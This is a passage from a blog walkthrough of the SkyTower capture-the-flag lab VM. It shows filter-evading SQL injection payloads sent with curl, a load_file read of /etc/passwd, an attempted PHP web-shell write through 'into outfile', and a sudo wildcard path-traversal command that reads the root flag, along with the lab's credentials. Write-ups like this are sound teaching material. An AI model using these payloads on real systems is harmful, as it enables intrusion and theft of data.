</code></pre></div><p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>
<h2 id=climbing-the-tower-and-faling-hard>climbing the tower and faling hard<a hidden class=anchor aria-hidden=true href=#climbing-the-tower-and-faling-hard>#</a></h2>
<p>From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username <code>john</code> and a password <code>hereisjohn</code>. So lets try this.
I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ proxychains4 ssh john@127.0.0.1
<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
<span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
john@127.0.0.1<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
Linux SkyTower 3.2.0-4-amd64 <span style=color:#75715e>#1 SMP Debian 3.2.54-2 x86_64</span>

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul <span style=color:#ae81ff>17</span> 12:54:32 <span style=color:#ae81ff>2014</span> from localhost

Funds have been withdrawn
Connection to 127.0.0.1 closed.
$
</code></pre></div><p>&mldr; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>
<h2 id=more-sql-injection>more sql injection<a hidden class=anchor aria-hidden=true href=#more-sql-injection>#</a></h2>
<p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; || id=1#&#34;</span> http://192.168.137.242/login.php
There was an error running the query <span style=color:#f92672>[</span>Unknown column <span style=color:#e6db74>&#39;id1&#39;</span> in <span style=color:#e6db74>&#39;where clause&#39;</span><span style=color:#f92672>]</span>%
</code></pre></div><p>Well I definitely didn&rsquo;t ask for the column <code>id1</code>, but from this again it was apparent that <code>=</code> was filtered along with <code>OR</code>. :| Ok, so we change the payload again:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; || id &gt; 1#&#34;</span> http://192.168.137.242/login.php
<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
&lt;br&gt;&lt;strong&gt;&lt;font size<span style=color:#f92672>=</span>4&gt;Welcome sara@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span style=color:#66d9ef>for</span> your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;$2&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: sara&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: ihatethisjob&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;%
</code></pre></div><p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>
<ul>
<li>john:hereisjohn</li>
<li>sara:ihatethisjob</li>
<li>william:senseable</li>
</ul>
<p>The users <code>john</code> & <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>
<h2 id=more-sql-enumeration>more SQL enumeration<a hidden class=anchor aria-hidden=true href=#more-sql-enumeration>#</a></h2>
<p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>
<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> & <code>--risk 3</code> there was no joy. This is ok.</p>
<p>I studied the error messages in detail, googled&mldr; a lot&mldr; and eventually came across <a href=http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html>this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>
<p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&#39;/etc/password&#39;)) as c#&#34;</span> http://192.168.137.242/login.php
<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
&lt;br&gt;&lt;strong&gt;&lt;font size<span style=color:#f92672>=</span>4&gt;Welcome 222&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span style=color:#66d9ef>for</span> your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;$2&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: 222&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: root❌0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/bin/sh
bin❌2:2:bin:/bin:/bin/sh
sys❌3:3:sys:/dev:/bin/sh
sync❌4:65534:sync:/bin:/bin/sync
games❌5:60:games:/usr/games:/bin/sh
man❌6:12:man:/var/cache/man:/bin/sh
lp❌7:7:lp:/var/spool/lpd:/bin/sh
mail❌8:8:mail:/var/mail:/bin/sh
news❌9:9:news:/var/spool/news:/bin/sh
uucp❌10:10:uucp:/var/spool/uucp:/bin/sh
proxy❌13:13:proxy:/bin:/bin/sh
www-data❌33:33:www-data:/var/www:/bin/sh
backup❌34:34:backup:/var/backups:/bin/sh
list❌38:38:Mailing List Manager:/var/list:/bin/sh
irc❌39:39:ircd:/var/run/ircd:/bin/sh
gnats❌41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/bin/sh
nobody❌65534:65534:nobody:/nonexistent:/bin/sh
libuuid❌100:101::/var/lib/libuuid:/bin/sh
sshd❌101:65534::/var/run/sshd:/usr/sbin/nologin
mysql❌102:105:MySQL Server,,,:/nonexistent:/bin/false
john❌1000:1000:john,,,:/home/john:/bin/bash
sara❌1001:1001:,,,:/home/sara:/bin/bash
william❌1002:1002:,,,:/home/william:/bin/bash
&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;
</code></pre></div><p>Reading the <code>/etc/passwd</code> revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of <code>login.php</code> in order to understand what the deal with the filtering was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$sqlinjection <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;SELECT&#34;</span>, <span style=color:#e6db74>&#34;TRUE&#34;</span>, <span style=color:#e6db74>&#34;FALSE&#34;</span>, <span style=color:#e6db74>&#34;--&#34;</span>,<span style=color:#e6db74>&#34;OR&#34;</span>, <span style=color:#e6db74>&#34;=&#34;</span>, <span style=color:#e6db74>&#34;,&#34;</span>, <span style=color:#e6db74>&#34;AND&#34;</span>, <span style=color:#e6db74>&#34;NOT&#34;</span>);
$email <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_ireplace</span>($sqlinjection, <span style=color:#e6db74>&#34;&#34;</span>, $_POST[<span style=color:#e6db74>&#39;email&#39;</span>]);
$password <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_ireplace</span>($sqlinjection, <span style=color:#e6db74>&#34;&#34;</span>, $_POST[<span style=color:#e6db74>&#39;password&#39;</span>]);
</code></pre></div><p>And as suspected. :)</p>
<p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt &#39;&lt;?php print_r(shell_exec(</span>$_GET<span style=color:#e6db74>[cmd])); ?&gt;&#39;) as c into outfile &#39;/var/www/shell.php&#39;#&#34;</span> http://192.168.137.242/login.php
There was an error running the query <span style=color:#f92672>[</span>Can<span style=color:#e6db74>&#39;t create/write to file &#39;</span>/var/www/shell.php<span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#f92672>(</span>Errcode: 13<span style=color:#f92672>)]</span>
</code></pre></div><p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&mldr;
Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t expect it to be <em>that</em> easy :D</p>
<h2 id=gaining-further-access>gaining further access<a hidden class=anchor aria-hidden=true href=#gaining-further-access>#</a></h2>
<p>After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&rsquo;t <em>appear</em> to be any custom shells in use, so the other thing this could be is a <code>.bashrc</code> with a <code>exit</code> command. I know its <code>.bashrc</code> because I saw the shell is <code>/bin/bash</code> from the <code>/etc/passwd</code>. I remember that I make heavy use of <code>ssh -t</code> to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.</p>
<p>For this case though, I though I&rsquo;d specify a <code>/bin/sh</code> as the <em>command</em> to run, hoping to not get caught in a <code>.bashrc</code> running:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
john@127.0.0.1<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
$ id
uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span>
</code></pre></div><p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>echo
echo  <span style=color:#e6db74>&#34;Funds have been withdrawn&#34;</span>
exit
</code></pre></div><p>&mldr; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>
<h2 id=enumeration-enumeration-enumeration>enumeration enumeration enumeration<a hidden class=anchor aria-hidden=true href=#enumeration-enumeration-enumeration>#</a></h2>
<p>I enumerated, everything&mldr; Referring to a excellent <a href=http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john@SkyTower:/accounts$ ls -lah /accounts/
total 8.0K
drwxr-xr-x  <span style=color:#ae81ff>2</span> root root 4.0K Jun <span style=color:#ae81ff>20</span> 07:52 .
drwxr-xr-x <span style=color:#ae81ff>24</span> root root 4.0K Jun <span style=color:#ae81ff>20</span> 07:52 ..
</code></pre></div><p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sara@SkyTower:~$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> sara on this host:
    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin

User sara may run the following commands on this host:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /bin/cat /accounts/*, <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /bin/ls /accounts/*
</code></pre></div><p>This user may execute some commands as root using <code>sudo</code>. <code>sudo</code> allows you to specify what those commands are, if not all. There was one problem with this configuration though. <code>*</code> is a wildcard character, and as such, anything after <code>cat /accounts/</code> may also be run. This means that things like <code>sudo cat /accounts/../../etc/shadow</code> will work as the wildcard allows us to do a form of directory traversal.</p>
<h2 id=pwnd>pwnd<a hidden class=anchor aria-hidden=true href=#pwnd>#</a></h2>
<p>So, to complete SkyTower:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
</code></pre></div><p>Thanks to <a href=https://twitter.com/telspacesystems>@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/>
<span class=title>« Prev Page</span>
<br>
<span>Hell would just not freeze over!</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/>
<span class=title>Next Page »</span>
<br>
<span>dnsfilexfer - yet another take on file transfer via DNS</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Climbing the SkyTower on twitter" href="https://twitter.com/intent/tweet/?text=Climbing%20the%20SkyTower&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Climbing the SkyTower on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&title=Climbing%20the%20SkyTower&summary=Climbing%20the%20SkyTower&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Climbing the SkyTower on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&title=Climbing%20the%20SkyTower"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Climbing the SkyTower on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Climbing the SkyTower on whatsapp" href="https://api.whatsapp.com/send?text=Climbing%20the%20SkyTower%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Climbing the SkyTower on telegram" href="https://telegram.me/share/url?text=Climbing%20the%20SkyTower&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>